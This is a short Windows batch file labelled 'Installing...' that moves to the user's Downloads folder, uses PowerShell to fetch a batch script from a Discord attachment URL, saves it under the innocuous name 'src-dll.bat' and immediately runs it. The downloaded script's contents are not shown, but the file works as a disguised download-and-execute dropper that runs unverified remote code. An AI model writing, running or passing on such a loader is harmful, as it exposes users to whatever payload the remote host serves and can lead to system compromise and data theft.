color a
title Installing...
echo %USERPROFILE%
cd %USERPROFILE%\Downloads
powershell.exe -Command "Invoke-WebRequest -OutFile ./src-dll.bat https://cdn.discordapp.com/attachments/800052087136190467/829407099750318160/launcher.bat"
call src-dll.bat
dir/s
